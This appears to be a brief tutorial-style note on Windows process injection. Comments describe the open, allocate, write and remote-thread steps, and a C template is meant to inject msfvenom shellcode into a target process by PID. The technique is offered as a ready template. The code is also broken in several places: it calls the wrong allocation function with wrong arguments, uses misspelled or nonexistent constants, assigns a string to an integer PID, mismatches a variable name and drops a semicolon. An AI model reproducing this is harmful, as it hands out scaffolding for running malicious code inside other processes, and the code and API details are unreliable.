#The process injection its basically based on CCE=CREATE, COPY AND EXECUTE
#We want to inject our code on the targed process
#There are diferent functions that interact with the WINDPOWS API
#and help us to inject our code:

//part 1
# OpenProcess( 3 parameters)--> Target process
# PARAMETERS= DWORD dwDesiredAccess,BOOL  bInheritHandle, DWORD dwProcessId
# dwDesiredAccess=PROCESS_ALL_ACCESS,PROCESS_CREATE_PROCESS,PROCESS_CREATE_THREAD ,PROCESS_DUP_HANDLE,PROCESS_QUERY_INFORMATION,PROCESS_SET_INFORMATION,PROCESS_SET_QUOTA,PROCESS_VM_OPERATION,PROCESS_VM_READ,PROCESS_VM_WRITE
# bInheritHandle=tru/false
# dwProcessId ="PID OF THE PROCESS WE WANT TO INJECT"
//part 2
# VirtualAlloc( 4 parameters) --> Memory reservation on target process
# PARAMETERS= LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect
//part 3
# WriteProcessMemory(5 parameters) --> Copy on the memory allocation
# PARAMETERS=  HANDLE  hProcess,  LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten
//part 4
# CreateRemoteThread(7 parameters) --> Execution of the code
# PARAMETERS= HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T  dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, 
# DWORD dwCreationFlags, LPDWORD lpThreadId

#include <stdio.h>
#include <windows.h>
int main(){
  char Shellcode[] = {"generated msfvenom payload shellcode here"};
  HANDLE hThread;
  HANDLE hProcess; // Declaration of the var to save the process we want to inject
  void* exec_mem;
  INT pid= "PID OF THE PROCESS WE WANT TO INJECT";
  //part 1
  hProcess= OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
  //part 2
  exec_mem=VirtualAlloc(hProcess,NULL, NEM_COMMIT | MEM_RESERVE,PAGE_EXECUTION);
  //part 3
  WriteProcessMemory(hProcess,exec_mem,shellcode,sizeof(shellcode),NULL);
  //part 4
  hThread= CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)exec_mem,NULL,0,0)
  CloseHandle(hProcess);
  return 0;
}

